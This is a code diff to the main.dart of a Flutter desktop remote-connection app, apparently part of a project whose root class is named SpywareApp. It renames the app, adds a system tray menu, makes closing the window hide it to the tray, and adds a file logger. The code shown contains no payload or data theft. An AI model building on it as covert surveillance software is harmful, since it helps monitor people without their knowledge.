@@ -1,27 +1,45 @@
+import 'dart:io';
 import 'package:flutter/material.dart';
 import 'package:flutter/services.dart';
 import 'package:provider/provider.dart';
 import 'package:window_manager/window_manager.dart';
+import 'package:system_tray/system_tray.dart';
 import 'package:flutter_dotenv/flutter_dotenv.dart';
 import 'providers/app_state.dart';
-import 'screens/dashboard_screen.dart';
-import 'screens/settings_screen.dart';
+import 'screens/home_screen.dart';
+import 'services/file_logger.dart';
 
 void main() async {
   WidgetsFlutterBinding.ensureInitialized();
   await dotenv.load();
+  await FileLogger.instance.init();
   await windowManager.ensureInitialized();
 
-  WindowOptions windowOptions = const WindowOptions(
-    size: Size(1200, 800),
-    minimumSize: Size(900, 600),
+  WindowOptions windowOptions = WindowOptions(
+    size: const Size(1200, 800),
+    minimumSize: const Size(900, 600),
     center: true,
-    title: 'AzulDesk - Conexión Remota',
+    title: 'AzulRemote',
+    skipTaskbar: false,
   );
   await windowManager.waitUntilReadyToShow(windowOptions, () async {
     await windowManager.show();
     await windowManager.focus();
   });
+
+  // Prevenir cierre real => minimizar a bandeja
+  windowManager.setPreventClose(true);
+  windowManager.setHasShadow(true);
+
+  _initSystemTray();
+
+  // Intentar cargar logo como icono de ventana
+  try {
+    final f = File('logo.png');
+    if (f.existsSync()) {
+      await windowManager.setIcon(f.path);
+    }
+  } catch (_) {}
 
   SystemChrome.setSystemUIOverlayStyle(SystemUiOverlayStyle.dark);
 
@@ -33,13 +51,46 @@ void main() async {
   );
 }
 
+Future<void> _initSystemTray() async {
+  final logoPath = File('logo.png').existsSync() ? File('logo.png').absolute.path : '';
+  final tray = SystemTray();
+  await tray.initSystemTray(iconPath: logoPath);
+
+  final menu = Menu();
+  menu.buildFrom([
+    MenuItemLabel(label: 'Mostrar', onClicked: (_) => windowManager.show()),
+    MenuItemLabel(label: 'Salir', onClicked: (_) async {
+      await windowManager.destroy();
+      exit(0);
+    }),
+  ]);
+  await tray.setContextMenu(menu);
+  await tray.setToolTip('AzulRemote - Conexion Remota');
+
+  tray.registerSystemTrayEventHandler((eventName) {
+    if (eventName == 'leftMouseDown' || eventName == 'doubleClick') {
+      windowManager.show();
+    }
+  });
+
+  windowManager.setPreventClose(true);
+  windowManager.addListener(_TrayWindowListener());
+}
+
+class _TrayWindowListener extends WindowListener {
+  @override
+  void onWindowClose() async {
+    await windowManager.hide();
+  }
+}
+
 class SpywareApp extends StatelessWidget {
   const SpywareApp({super.key});
 
   @override
   Widget build(BuildContext context) {
     return MaterialApp(
-      title: 'AzulDesk - Conexión Remota',
+      title: 'AzulRemote',
       debugShowCheckedModeBanner: false,
       theme: ThemeData(
         colorScheme: ColorScheme.dark(
@@ -48,48 +99,7 @@ class SpywareApp extends StatelessWidget {
         ),
         useMaterial3: true,
       ),
-      home: const MainShell(),
-    );
-  }
-}
-
-class MainShell extends StatefulWidget {
-  const MainShell({super.key});
-
-  @override
-  State<MainShell> createState() => _MainShellState();
-}
-
-class _MainShellState extends State<MainShell> {
-  int _selectedIndex = 0;
-
-  final List<Widget> _screens = const [
-    DashboardScreen(),
-    SettingsScreen(),
-  ];
-
-  @override
-  Widget build(BuildContext context) {
-    return Scaffold(
-      body: _screens[_selectedIndex],
-      bottomNavigationBar: NavigationBar(
-        backgroundColor: const Color(0xFF161B22),
-        indicatorColor: const Color(0xFF1F2937),
-        selectedIndex: _selectedIndex,
-        onDestinationSelected: (i) => setState(() => _selectedIndex = i),
-        destinations: const [
-          NavigationDestination(
-            icon: Icon(Icons.desktop_windows_outlined, color: Colors.white54),
-            selectedIcon: Icon(Icons.desktop_windows, color: Color(0xFF58A6FF)),
-            label: 'Dispositivos',
-          ),
-          NavigationDestination(
-            icon: Icon(Icons.settings_outlined, color: Colors.white54),
-            selectedIcon: Icon(Icons.settings, color: Color(0xFF58A6FF)),
-            label: 'Configuracion',
-          ),
-        ],
-      ),
+      home: const HomeScreen(),
     );
   }
 }
